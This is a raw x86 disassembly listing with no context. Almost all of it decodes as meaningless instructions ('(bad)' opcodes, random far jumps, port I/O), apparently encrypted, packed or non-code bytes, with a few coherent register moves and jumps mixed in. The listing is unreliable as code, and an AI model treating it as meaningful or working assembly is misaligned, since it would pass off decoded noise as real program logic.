  4104dc:	xlat   BYTE PTR ds:[ebx]
  4104dd:	jecxz  0x4104db
  4104df:	inc    ebx
  4104e0:	jmp    0x6808:0xb4b29e09
  4104e7:	outs   dx,DWORD PTR ds:[esi]
  4104e8:	scas   al,BYTE PTR es:[edi]
  4104e9:	mov    bh,0x43
  4104eb:	push   0x469a79dc
  4104f0:	popa   
  4104f1:	inc    ebx
  4104f2:	push   esi
  4104f3:	mov    eax,0xe08e3eb6
  4104f8:	outs   dx,BYTE PTR ds:[esi]
  4104f9:	jge    0x410495
  4104fb:	repnz pusha 
  4104fd:	mov    al,ds:0x12d30cb9
  410502:	dec    eax
  410503:	sub    cl,BYTE PTR [esi+0x72fedf01]
  410509:	add    DWORD PTR [ebx+0x44],eax
  41050c:	fyl2x  
  41050e:	adc    bh,ah
  410510:	loop   0x41055a
  410512:	jl     0x41056d
  410514:	xor    esi,DWORD PTR [ecx+edx*4-0x4f]
  410518:	sbb    eax,0xcc458f9b
  41051d:	sub    DWORD PTR [esi],esp
  41051f:	aam    0x87
  410521:	scas   eax,DWORD PTR es:[edi]
  410522:	and    eax,0xc19bcb80
  410527:	ja     0x41053a
  410529:	and    al,0x3f
  41052b:	and    BYTE PTR [edi-0x6fdb870e],ah
  410531:	fwait
  410532:	mov    dh,0x54
  410534:	pop    eax
  410535:	sub    ah,BYTE PTR [ecx-0x7a]
  410538:	and    al,0xe0
  41053a:	push   esp
  41053b:	mov    esi,DWORD PTR [edx]
  41053d:	adc    al,0x36
  41053f:	test   bh,al
  410541:	pop    edi
  410542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410543:	in     al,0xda
  410545:	jb     0x41058e
  410547:	sbb    dl,dh
  410549:	es daa 
  41054b:	xchg   ebp,eax
  41054c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41054d:	ror    dh,cl
  41054f:	clc    
  410550:	jae    0x4105b1
  410552:	sar    DWORD PTR [esi+eiz*4-0x3a3962e4],cl
  410559:	mov    al,ds:0x5b0b7e58
  41055e:	clc    
  41055f:	pusha  
  410560:	cld    
  410561:	inc    ecx
  410562:	sbb    al,0xaf
  410564:	loope  0x410511
  410566:	pop    ecx
  410567:	loopne 0x410559
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	daa    
  410584:	bound  ebx,QWORD PTR [esp+ecx*1+0x78785339]
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	ins    DWORD PTR es:[edi],dx
  410590:	mov    eax,ds:0x34bec281
  410595:	jecxz  0x410525
  410597:	sbb    DWORD PTR [eax],edi
  410599:	mov    BYTE PTR [esi-0x222a86c],bl
  41059f:	fcom   QWORD PTR [ebx]
  4105a1:	in     eax,0xa0
  4105a3:	dec    ebp
  4105a4:	enter  0x588b,0xc1
  4105a8:	mov    eax,0x71cabbaa
  4105ad:	push   0x5b
  4105af:	js     0x41062f
  4105b1:	sahf   
  4105b2:	sahf   
  4105b3:	mov    bl,0x4c
  4105b5:	mov    dh,0x5d
  4105b7:	sub    DWORD PTR [edi+0x6dddcaf7],ecx
  4105bd:	ins    BYTE PTR es:[edi],dx
  4105be:	loope  0x4105bb
  4105c0:	(bad)  
  4105c1:	outs   dx,BYTE PTR ds:[esi]
  4105c2:	inc    eax
  4105c3:	cld    
  4105c4:	jb     0x41062e
  4105c6:	pushf  
  4105c7:	loopne 0x410590
  4105c9:	xor    BYTE PTR [eax],cl
  4105cb:	adc    ebx,DWORD PTR [ebp-0x4bf0fe4]
  4105d1:	xlat   BYTE PTR ds:[ebx]
  4105d2:	out    0xd6,al
  4105d4:	and    DWORD PTR ds:0xf911ea12,eax
  4105da:	enter  0xf07e,0x9f
  4105de:	sbb    BYTE PTR [edi-0x2d9bec0d],al
  4105e4:	in     eax,dx
  4105e5:	call   0x30682a99
  4105ea:	push   esp
  4105eb:	cmp    al,0xee
  4105ed:	loopne 0x41056f
  4105ef:	push   es
  4105f0:	neg    DWORD PTR [esi+ecx*8]
  4105f3:	or     esi,DWORD PTR [eax-0x243baa0e]
  4105f9:	aas    
  4105fa:	das    
  4105fb:	lods   eax,DWORD PTR ds:[esi]
  4105fc:	mov    dh,0x52
  4105fe:	repz test al,0x9
  410601:	cwde   
  410602:	adc    eax,0xd2ef2f7f
  410607:	add    DWORD PTR [edx],edi
  410609:	cwde   
  41060a:	out    0xa1,eax
  41060c:	aam    0xe1
  41060e:	xlat   BYTE PTR ds:[ebx]
  41060f:	mov    dl,0x59
  410611:	scas   al,BYTE PTR es:[edi]
  410612:	into   
  410613:	imul   esi,DWORD PTR [ecx+0x3],0x6e5ad529
  41061a:	icebp  
  41061b:	mov    bl,0xd8
  41061d:	stc    
  41061e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41061f:	add    eax,0x1f5861b9
  410624:	stos   DWORD PTR es:[edi],eax
  410625:	div    DWORD PTR [edi-0x672fa68a]
  41062b:	sbb    ebp,DWORD PTR ds:0xfea2c0a2
  410631:	cwde   
  410632:	mov    ebx,0x5d0270ad
  410637:	xchg   ecx,eax
  410638:	retf   0xa21b
  41063b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41063c:	aaa    
  41063d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063e:	and    DWORD PTR ds:0x9642c23,ecx
  410644:	jbe    0x410609
  410646:	add    al,0x42
  410648:	push   eax
  410649:	cmp    ecx,ebp
  41064b:	xor    ecx,DWORD PTR [ebx-0x2c51a28c]
  410651:	or     bh,dh
  410653:	jns    0x410691
  410655:	icebp  
  410656:	int3   
  410657:	(bad)  
  410658:	shr    DWORD PTR [edi+0x3e],0x80
  41065c:	xchg   esp,eax
  41065d:	int    0xcd
  41065f:	jne    0x41069b
  410661:	cmp    BYTE PTR [ebp+0x6547bd90],0x75
  410668:	push   esp
  410669:	push   0xe4f05fbf
  41066e:	mov    dl,0x57
  410670:	sbb    BYTE PTR [edx],cl
  410672:	sar    edi,cl
  410674:	imul   esi,DWORD PTR [eax-0x7276ec8d],0x6acebd0e
  41067e:	jno    0x4106f4
  410680:	and    eax,0x3df8555b
  410685:	jb     0x410705
  410687:	xchg   edi,eax
  410688:	pushf  
  410689:	xchg   edx,eax
  41068a:	iret   
  41068b:	adc    DWORD PTR [ecx+ebx*1+0x39],ebx
  41068f:	mov    edi,0xbb13d4d2
  410694:	dec    eax
  410695:	push   ss
  410696:	pop    edx
  410697:	jnp    0x4106b2
  410699:	pop    esp
  41069a:	in     eax,0xb8
  41069c:	inc    esi
  41069d:	fwait
  41069e:	int3   
  41069f:	jmp    0x3b2c:0x801ef73b
  4106a6:	gs daa 
  4106a8:	repnz shl DWORD PTR [ebp+0x561d7c6f],cl
  4106af:	cmp    ch,BYTE PTR [esi+0xc]
  4106b2:	dec    esi
  4106b3:	pop    ebx
  4106b4:	lods   al,BYTE PTR ds:[esi]
  4106b5:	push   es
  4106b6:	mov    ah,BYTE PTR [esi+ecx*2-0x58]
  4106ba:	jae    0x41068b
  4106bc:	xchg   edi,eax
  4106bd:	xchg   ebx,eax
  4106be:	lods   eax,DWORD PTR ds:[esi]
  4106bf:	imul   edx,DWORD PTR [ebx+0x670dfc45],0x5e
  4106c6:	inc    eax
  4106c7:	ret    0xaeb3
  4106ca:	cwde   
  4106cb:	inc    ecx
  4106cc:	jg     0x4106c7
  4106ce:	inc    ebx
  4106cf:	outs   dx,DWORD PTR ds:[esi]
  4106d0:	xchg   esi,eax
  4106d1:	sub    dh,BYTE PTR [ecx]
  4106d3:	push   cs
  4106d4:	sub    edx,eax
  4106d6:	mov    ds:0xaeed728c,eax
  4106db:	jne    0x410715
  4106dd:	jmp    0x882e73f0
  4106e2:	sub    ah,0xa5
  4106e5:	push   ds
  4106e6:	inc    ebp
  4106e7:	inc    edi
  4106e8:	lods   al,BYTE PTR ds:[esi]
  4106e9:	xchg   eax,edi
  4106eb:	jmp    0xdb0:0x83746e34
  4106f2:	lahf   
  4106f3:	repnz enter 0x1483,0x9f
  4106f8:	pop    esp
  4106f9:	lods   al,BYTE PTR ds:[esi]
  4106fa:	cmp    eax,0x42a4451b
  4106ff:	push   esp
  410700:	pop    esp
  410701:	stc    
  410702:	push   ecx
  410703:	je     0x4106fc
  410705:	mov    esp,0xbc93eb05
  41070a:	data16 mov bh,0x86
  41070d:	(bad)  
  41070e:	fmulp  st(2),st
  410710:	push   ebp
  410711:	mov    bl,0x4b
  410713:	mov    edx,cs
  410715:	pop    edi
  410716:	fs icebp 
  410718:	sti    
  410719:	daa    
  41071a:	jge    0x410752
  41071c:	mov    edx,0x6572092e
  410721:	xchg   ebx,eax
  410722:	int    0x3a
  410724:	out    dx,al
  410725:	repnz mov edi,DWORD PTR [edi-0x23d02e21]
  41072c:	push   ebx
  41072d:	out    0xed,al
  41072f:	inc    edi
  410730:	fiadd  DWORD PTR [esi+0x64af2d7a]
  410736:	add    DWORD PTR [eax],ecx
  410738:	loopne 0x410772
  41073a:	call   0x920b:0x70323407
  410741:	adc    al,0xaf
  410743:	jle    0x41073b
  410745:	aad    0x38
  410747:	test   DWORD PTR [ebp-0x29],0x9d72486c
  41074e:	call   0x382:0x3b87ca96
  410755:	sbb    al,0x44
  410757:	dec    ebp
  410758:	popf   
  410759:	retf   
  41075a:	sbb    al,0xa
  41075c:	je     0x410719
  41075e:	jae    0x410700
  410760:	std    
  410761:	arpl   WORD PTR [esi],ax
  410763:	shl    BYTE PTR [ebx],1
  410765:	rcl    ch,0x8f
  410768:	jle    0x4107b1
  41076a:	mov    al,ds:0x7d136b98
  41076f:	mov    edi,0xaaae8ea6
  410774:	icebp  
  410775:	iret   
  410776:	cmc    
  410777:	sub    ebx,DWORD PTR [edx]
  410779:	sbb    ah,BYTE PTR [ebp+edx*1+0x5f]
  41077d:	addr16 sbb al,0x13
  410780:	inc    ebp
  410781:	inc    ecx
  410782:	mov    bl,0x81
  410784:	and    al,0xc5
  410786:	pop    eax
  410787:	(bad)  
  410788:	into   
  410789:	hlt    
  41078a:	xor    eax,0x182eee57
  41078f:	dec    esp
  410790:	xchg   ebx,eax
  410791:	or     BYTE PTR [esi],ah
  410793:	imul   ecx
  410795:	lods   al,BYTE PTR ds:[esi]
  410796:	or     bh,BYTE PTR [edx+0x64c05735]
  41079c:	jg     0x4107dc
  41079e:	stos   BYTE PTR es:[edi],al
  41079f:	das    
  4107a0:	pop    ss
  4107a1:	leave  
  4107a2:	mov    WORD PTR [ebp-0x2d],?
  4107a5:	push   0x4f
  4107a7:	out    0xf2,eax
  4107a9:	inc    ecx
  4107aa:	pop    ebp
  4107ab:	cwde   
  4107ac:	cdq    
  4107ad:	pop    ecx
  4107ae:	sbb    bh,cl
  4107b0:	stos   BYTE PTR es:[edi],al
  4107b1:	repz shl DWORD PTR [bx+0x6581],0x15
  4107b8:	aam    0x7e
  4107ba:	(bad)  
  4107bb:	clc    
  4107bc:	daa    
  4107bd:	mov    edx,esp
  4107bf:	inc    eax
  4107c0:	mov    esi,0xab037ee
  4107c5:	mov    bh,0x0
  4107c7:	data16 aas 
  4107c9:	inc    esi
  4107ca:	out    dx,al
  4107cb:	and    al,0x94
  4107cd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107cf:	cmp    al,0x3
  4107d1:	mov    ds:0x3222512f,eax
  4107d6:	push   esp
  4107d7:	push   0xffffffbd
  4107d9:	sub    edx,DWORD PTR [ebx]
  4107db:	and    al,0x76
  4107dd:	outs   dx,BYTE PTR ds:[esi]
  4107de:	sub    ah,al
  4107e0:	out    dx,al
  4107e1:	les    eax,FWORD PTR [eax]
  4107e3:	or     eax,0x59db3115
  4107e8:	int3   
  4107e9:	and    bl,BYTE PTR [ebp-0x51b76b26]
  4107ef:	mov    BYTE PTR [ebp+0x5541a654],0xf2
  4107f6:	(bad)  
  4107f8:	out    0x13,al
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	or     bl,dl
  410811:	xchg   ecx,eax
  410812:	xchg   ecx,eax
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	mov    WORD PTR [esi-0x58403497],gs
  410821:	mov    ds:0xdf15f56e,eax
  410826:	dec    edx
  410827:	scas   al,BYTE PTR es:[edi]
  410828:	jns    0x41082c
  41082a:	mov    es,WORD PTR [ebx-0x55f55dc8]
  410830:	sub    ah,ah
  410832:	fwait
  410833:	push   esp
  410834:	adc    al,0x29
  410836:	dec    eax
  410837:	mov    cs,WORD PTR [ebp-0x47]
  41083a:	into   
  41083b:	jns    0x410888
  41083d:	and    al,0x10
  41083f:	mov    al,0x35
  410841:	(bad)  [edx+0x6ac7d086]
  410847:	mov    cl,0xe4
  410849:	scas   al,BYTE PTR es:[edi]
  41084a:	jbe    0x410866
  41084c:	retf   
  41084d:	and    DWORD PTR [ebx+0x59f3ccb5],esi
  410853:	mov    dh,BYTE PTR [ebx+0x7dd38084]
  410859:	cmp    al,0x2e
  41085b:	mov    ds,WORD PTR [esi]
  41085d:	dec    eax
  41085e:	popf   
  41085f:	xlat   BYTE PTR ds:[ebx]
  410860:	pop    ebx
  410861:	into   
  410862:	push   0xfffffff3
  410864:	sbb    eax,0xfd2f3484
  410869:	imul   esp,DWORD PTR [ecx],0x76
  41086c:	xor    BYTE PTR [esi],dl
  41086e:	loop   0x41083d
  410870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410871:	sub    eax,DWORD PTR [edx]
  410873:	lahf   
  410874:	and    al,0x9c
  410876:	dec    esi
  410877:	pop    eax
  410878:	sub    al,ah
  41087a:	add    eax,0xad05863
  41087f:	and    BYTE PTR [edi+esi*2+0x639df726],dh
  410886:	add    edx,DWORD PTR [esi-0x7b3c0421]
  41088c:	adc    ebp,edx
  41088e:	inc    ebp
  41088f:	push   eax
  410890:	cmc    
  410891:	inc    esp
  410892:	imul   eax,DWORD PTR [ebp-0x22],0x38
  410896:	test   al,0xc4
  410898:	repz (bad) 
  41089a:	int3   
  41089b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089c:	mov    ecx,0x54083303
  4108a1:	ss add al,0xb1
  4108a4:	jl     0x410840
  4108a6:	ins    DWORD PTR es:[edi],dx
  4108a7:	enter  0xa173,0x24
  4108ab:	sub    al,0x6c
  4108ad:	mov    WORD PTR [ebp-0x20e51997],ss
  4108b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108b4:	inc    esp
  4108b5:	dec    ebx
  4108b6:	popf   
  4108b7:	jae    0x4108e5
  4108b9:	push   ds
  4108ba:	xor    eax,0xa774469a
  4108bf:	push   edx
  4108c0:	mov    edx,0xd91f4015
  4108c5:	fidivr WORD PTR [eax+0x35]
  4108c8:	mov    ds:0x32f56a4e,al
  4108cd:	or     ebx,DWORD PTR [ebp+0x57]
  4108d0:	ret    0x18f9
  4108d3:	pop    esp
  4108d4:	jmp    0xb3c4:0x46202a2d
  4108db:	sahf   
  4108dc:	and    cl,ah
  4108de:	mov    ah,0xec
  4108e0:	add    eax,0x8ab8c672
  4108e5:	sbb    edx,0x62534fda
  4108eb:	ins    BYTE PTR es:[edi],dx
  4108ec:	jl     0x41088f
  4108ee:	jno    0x41093f
  4108f0:	into   
  4108f1:	push   cs
  4108f2:	push   ecx
  4108f3:	or     DWORD PTR [edx+edx*2-0x51e0c497],edx
  4108fa:	mov    eax,0xf0ea5252
  4108ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410900:	stos   DWORD PTR es:[edi],eax
  410901:	dec    edx
  410902:	fmul   DWORD PTR [esi-0x73ad717f]
  410908:	and    ebx,DWORD PTR [edx]
  41090a:	enter  0x5273,0xf9
  41090e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41090f:	outs   dx,BYTE PTR cs:[esi]
  410911:	or     al,al
  410913:	and    eax,0xa32c61bd
  410918:	mov    eax,0x1f9f70ba
  41091d:	add    bh,BYTE PTR ds:[ecx]
  410920:	mov    ah,0xb6
  410922:	les    edx,FWORD PTR [edi-0x45]
  410925:	outs   dx,DWORD PTR ds:[esi]
  410926:	jb     0x410975
  410928:	test   al,0x81
  41092a:	in     eax,dx
  41092b:	pop    edi
  41092c:	mov    esp,0x7a06047b
  410931:	jl     0x4108ef
  410933:	jge    0x410993
  410935:	repz mov edx,0x14016bd7
  41093b:	jg     0x410959
  41093d:	pop    eax
  41093e:	sbb    bh,BYTE PTR [ebx]
  410940:	cmp    ecx,edx
  410942:	pop    eax
  410943:	int    0x43
  410945:	inc    edx
  410946:	cmp    eax,0xdc437574
  41094b:	(bad)  
  41094c:	mov    edx,0xfdc6c314
  410951:	sub    ebx,DWORD PTR [eax+0x5ce2401a]
  410957:	mov    ebp,?
  410959:	mov    cs,eax
  41095b:	jge    0x410949
  41095d:	data16 or bh,bh
  410960:	fld    QWORD PTR [ebx]
  410962:	adc    eax,0xfd759ad1
  410967:	xor    DWORD PTR [ebx],esp
  410969:	cld    
  41096a:	push   ss
  41096b:	arpl   bx,cx
  41096d:	popf   
  41096e:	dec    ecx
  41096f:	popf   
  410970:	ins    BYTE PTR es:[edi],dx
  410971:	fld    st(1)
  410973:	dec    ebx
  410974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410975:	xor    ch,BYTE PTR ds:0x84cb2948
  41097b:	jnp    0x4109b5
  41097d:	imul   ch
  41097f:	outs   dx,BYTE PTR ds:[esi]
  410980:	stos   DWORD PTR es:[edi],eax
  410981:	pushf  
  410982:	sub    al,0x73
  410984:	cli    
  410985:	(bad)  
  410987:	sub    eax,0x7b2af7df
  41098c:	popa   
  41098d:	stos   BYTE PTR es:[edi],al
  41098e:	idiv   DWORD PTR [edi+0x6922ed52]
  410994:	mov    ebp,0x3844b3de
  410999:	rol    BYTE PTR [esi+0x7],1
  41099c:	addr16 push es
  41099e:	mov    edi,0x31c6b1e4
  4109a3:	aas    
  4109a4:	jle    0x4109a2
  4109a6:	cs ret 
  4109a8:	icebp  
  4109a9:	jnp    0x410969
  4109ab:	test   DWORD PTR [ebp-0x2de2debf],ecx
  4109b1:	xchg   ebx,eax
  4109b2:	ins    BYTE PTR es:[edi],dx
  4109b3:	ss retf 0x57b3
  4109b7:	es mov ?,ebx
  4109ba:	xor    ah,BYTE PTR [eax]
  4109bc:	dec    esi
  4109bd:	psubb  mm2,QWORD PTR [edx-0x408a18ab]
  4109c4:	das    
  4109c5:	sub    al,0xdd
  4109c7:	cmp    DWORD PTR [esi+0x4e8a67e],edx
  4109cd:	xchg   esi,eax
  4109ce:	cs add eax,0x97cf0587
  4109d4:	ror    dl,cl
  4109d6:	push   edi
  4109d7:	test   BYTE PTR [ecx-0x330183c1],bl
  4109dd:	cmp    ah,BYTE PTR [ebp-0xb5514da]
  4109e3:	nop
  4109e4:	xor    bh,0x5e
  4109e7:	adc    ch,0x4d
  4109ea:	mov    edx,0xa0f6400f
  4109ef:	popf   
  4109f0:	xor    ch,BYTE PTR [ecx+0xb]
  4109f3:	jg     0x4109b5
  4109f5:	aad    0xa4
  4109f7:	jle    0x410a50
  4109f9:	inc    edi
  4109fa:	push   edx
  4109fb:	shr    bl,cl
  4109fd:	mov    al,ds:0x2093d6d7
  410a02:	and    DWORD PTR [ebp+0x2706b354],esp
  410a08:	jmp    0xb1769656
  410a0d:	dec    ebp
  410a0e:	mov    DWORD PTR [edi-0x764214fa],eax
  410a14:	fisttp WORD PTR [ebx]
  410a16:	ret    
  410a17:	add    bl,dl
  410a19:	jmp    0x4109f3
  410a1b:	in     al,0x2
  410a1d:	loope  0x410a64
  410a1f:	push   0xffffffac
  410a21:	or     BYTE PTR [esi+0x4beec9b4],ch
  410a27:	jmp    0x410a86
  410a29:	dec    eax
  410a2a:	and    BYTE PTR [ecx+0x72],dh
  410a2d:	call   0x1e9:0xa12b0261
  410a34:	mov    edx,0x6e52f9ff
  410a39:	xchg   ebp,eax
  410a3a:	test   DWORD PTR [eax],esi
  410a3c:	jne    0x410a1e
  410a3e:	xchg   BYTE PTR [ebp-0x5d],bl
  410a41:	inc    edx
  410a42:	xchg   DWORD PTR [edx+0x3c],esp
  410a45:	adc    DWORD PTR [eax-0x49],ebp
  410a48:	not    DWORD PTR [ecx-0x8]
  410a4b:	or     DWORD PTR [ecx+0x16],ecx
  410a4e:	sti    
  410a4f:	sbb    dh,BYTE PTR [esi+eax*8-0x60]
  410a53:	mov    edi,0x1cae80b5
  410a58:	(bad)  
  410a5a:	cmp    al,0xbf
  410a5c:	sbb    bh,BYTE PTR [ebp+0x38]
  410a5f:	jo     0x4109ed
  410a61:	lahf   
  410a62:	mov    ebx,0x2d271758
  410a67:	xor    al,0x7e
  410a69:	dec    edi
  410a6a:	sbb    edi,ebp
  410a6c:	push   ecx
  410a6d:	cmp    ebx,DWORD PTR ds:0x8f20add
  410a73:	vpsubsb ymm3,ymm0,YMMWORD PTR [eax+0x5c]
  410a78:	mov    bl,0xf1
  410a7a:	cmp    BYTE PTR [ebx+eax*8-0x66],ch
  410a7e:	push   0x4e1f5bbd
  410a83:	repnz lods eax,DWORD PTR ds:[esi]
  410a85:	retf   
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	mul    DWORD PTR [eax]
  410ab0:	fidiv  DWORD PTR [esi+0x78561318]
  410ab6:	js     0x410a9d
  410ab8:	jle    0x410b32
  410aba:	js     0x410b29
  410abc:	push   es
  410abd:	xchg   ecx,eax
  410abe:	cmp    al,0x6f
  410ac0:	jno    0x410ae6
  410ac2:	fwait
  410ac3:	and    dh,BYTE PTR [ecx-0x5b]
  410ac6:	mov    eax,ds:0xaf97be38
  410acb:	arpl   WORD PTR [ebx+esi*1],di
  410ace:	outs   dx,BYTE PTR ds:[esi]
  410acf:	int    0xc
  410ad1:	loope  0x410af0
  410ad3:	loopne 0x410af9
  410ad5:	sub    DWORD PTR [esi],edx
  410ad7:	jmp    0xaeffe9e0
  410adc:	leave  
  410add:	loopne 0x410a85
  410adf:	das    
  410ae0:	jecxz  0x410af2
  410ae2:	rol    DWORD PTR [edx+0x3],1
  410ae5:	loop   0x410ab5
  410ae7:	jg     0x410b04
  410ae9:	cwde   
  410aea:	xchg   ebp,eax
  410aeb:	jmp    0x96b1:0x9b0829d1
  410af2:	retf   
  410af3:	test   BYTE PTR [edi],dh
  410af5:	mov    WORD PTR [edx],ss
  410af7:	call   0x7e38:0xd6b3b1c5
  410afe:	icebp  
  410aff:	das    
  410b00:	add    al,0x89
  410b02:	xchg   BYTE PTR [ecx-0x2],ah
  410b05:	xor    DWORD PTR [eax+0x21],0xb30fe3cc
  410b0c:	and    ebp,DWORD PTR [ecx]
  410b0e:	cdq    
  410b0f:	hlt    
  410b10:	xor    edx,DWORD PTR [eax+ebx*1-0x33285a81]
  410b17:	jmp    DWORD PTR [esp+eax*2]
  410b1a:	pop    esi
  410b1b:	stc    
  410b1c:	pop    es
  410b1d:	xor    esp,DWORD PTR [ebx+esi*4+0x5f557fe2]
  410b24:	leave  
  410b25:	cld    
  410b26:	add    bl,ch
  410b28:	push   ebp
  410b29:	js     0x410b71
  410b2b:	inc    esp
  410b2c:	scas   eax,DWORD PTR es:[edi]
  410b2d:	mov    ch,0x9d
  410b2f:	and    eax,DWORD PTR [esi-0x65adc15b]
  410b35:	dec    edi
  410b36:	(bad)  
  410b37:	inc    DWORD PTR [esp+esi*8-0x1c60b9cd]
  410b3e:	out    0xb3,al
  410b40:	scas   al,BYTE PTR es:[edi]
  410b41:	mov    al,0xa4
  410b43:	rol    DWORD PTR [ecx],1
  410b45:	xchg   ax,ax
  410b47:	and    ebx,DWORD PTR [edx+0x43b5e800]
  410b4d:	lods   eax,DWORD PTR ds:[esi]
  410b4e:	push   ebx
  410b4f:	sbb    al,0xdd
  410b51:	xchg   edx,eax
  410b52:	xchg   edx,eax
  410b53:	lahf   
  410b54:	jnp    0x410b8d
  410b56:	daa    
  410b57:	sar    esp,1
  410b59:	add    DWORD PTR [ebp+0x6],esp
  410b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b5d:	and    eax,0x30b64924
  410b62:	push   0x9ca41405
  410b67:	mov    dh,0xa4
  410b69:	js     0x410b28
  410b6b:	dec    eax
  410b6c:	mov    bh,ch
  410b6e:	ja     0x410b8a
  410b70:	add    ch,BYTE PTR [ecx]
  410b72:	fsub   DWORD PTR [ecx-0x29]
  410b75:	shl    DWORD PTR [ecx+ecx*4+0x7ece1da4],1
  410b7c:	ss pop ds
  410b7e:	sbb    DWORD PTR es:[esi+0x77],eax
  410b82:	add    BYTE PTR [eax+0x2175c83f],0x29
  410b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b8a:	dec    esi
  410b8b:	fstp   QWORD PTR ds:0xaf2e6447
  410b91:	sbb    al,0x24
  410b93:	scas   al,BYTE PTR es:[edi]
  410b94:	nop
  410b95:	push   ebx
  410b96:	enter  0x9a8f,0x33
  410b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b9b:	in     al,0x5e
  410b9d:	shr    BYTE PTR [esi+0x6a],cl
  410ba0:	(bad)  
  410ba1:	jmp    0x410bf3
  410ba3:	jmp    0x28d08699
  410ba8:	test   al,0xff
  410baa:	stos   DWORD PTR es:[edi],eax
  410bab:	test   eax,0xd731a4cf
  410bb0:	mov    al,ds:0x171c64dc
  410bb5:	xchg   esi,eax
  410bb6:	mov    dh,0x18
  410bb8:	mov    ebp,0xfe2af85a
  410bbd:	inc    ecx
  410bbe:	mov    dl,0xc1
  410bc0:	out    dx,eax
  410bc1:	jns    0x410c20
  410bc3:	rcr    BYTE PTR [esi],1
  410bc5:	push   cs
  410bc6:	pop    esp
  410bc7:	popa   
  410bc8:	es push cs
  410bca:	jp     0x410b6e
  410bcc:	dec    ebx
  410bcd:	lods   al,BYTE PTR ds:[esi]
  410bce:	xchg   ebx,eax
  410bcf:	adc    DWORD PTR [edi-0x56],eax
  410bd2:	fwait
  410bd3:	mov    eax,ds:0xdfc454b
  410bd8:	cmp    eax,0xb85b27b2
  410bdd:	jle    0x410bcd
  410bdf:	sbb    edx,DWORD PTR [ebp-0x70]
  410be2:	adc    DWORD PTR [esi+0x46c35c77],edx
  410be8:	frndint 
  410bea:	inc    esp
  410beb:	xchg   edx,eax
  410bec:	sub    dl,BYTE PTR [ebx]
  410bee:	sbb    ebx,DWORD PTR [ebp+0x66]
  410bf1:	std    
  410bf2:	jmp    0x410c32
  410bf4:	in     al,dx
  410bf5:	sbb    BYTE PTR [ecx+0x68],dl
  410bf8:	jmp    0xfd3a02bb
  410bfd:	sbb    eax,0x26b5fad2
  410c02:	jbe    0x410bc2
  410c04:	push   esp
  410c05:	inc    esi
  410c06:	cmp    bh,BYTE PTR [eax+0x15]
  410c09:	jl     0x410bbd
  410c0b:	mov    ebp,0x9b2c5963
  410c10:	jp     0x410c70
  410c12:	adc    al,0x4c
  410c14:	cwde   
  410c15:	pusha  
  410c16:	mov    cl,0x25
  410c18:	pop    ebp
  410c19:	sar    BYTE PTR gs:0x835a8bb1,cl
  410c20:	cwde   
  410c21:	adc    al,0x8b
  410c23:	(bad)  
  410c24:	mov    ch,0x7
  410c26:	loopne 0x410c07
  410c28:	mov    edi,0xadf41c0d
  410c2d:	dec    esi
  410c2e:	fldcw  WORD PTR [edx]
  410c30:	lods   al,BYTE PTR ds:[esi]
  410c31:	adc    al,0x98
  410c33:	jp     0x410c14
  410c35:	(bad)  
  410c36:	push   ds
  410c37:	sbb    al,0x1f
  410c39:	adc    ebp,ebp
  410c3b:	loope  0x410c36
  410c3d:	mov    esi,0xaa57d2ed
  410c42:	das    
  410c43:	mov    ds:0x2ab42165,eax
  410c48:	pinsrw mm0,edx,0xf1
  410c4c:	pop    DWORD PTR [ebx]
  410c4e:	(bad)  
  410c4f:	mov    edx,0x14a3b016
  410c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c55:	loop   0x410c4b
  410c57:	rcr    DWORD PTR [edx-0xf],1
  410c5a:	pop    ss
  410c5b:	xchg   BYTE PTR [edx+0x473dca26],cl
  410c61:	mov    ds:0x7a6e3076,eax
  410c66:	fistp  DWORD PTR [esi+ebp*2]
  410c69:	pushf  
  410c6a:	fnstcw WORD PTR [esp+ebp*2-0x6e]
  410c6e:	push   ebp
  410c6f:	jmp    0x6f7739d6
  410c74:	jmp    0x713a8dad
  410c79:	push   ss
  410c7a:	fidivr WORD PTR [edx+0x50c71aec]
  410c80:	neg    DWORD PTR [eax-0x7a]
  410c83:	push   cs
  410c84:	into   
  410c85:	ret    0x3e8a
  410c88:	call   0x526a6ac3
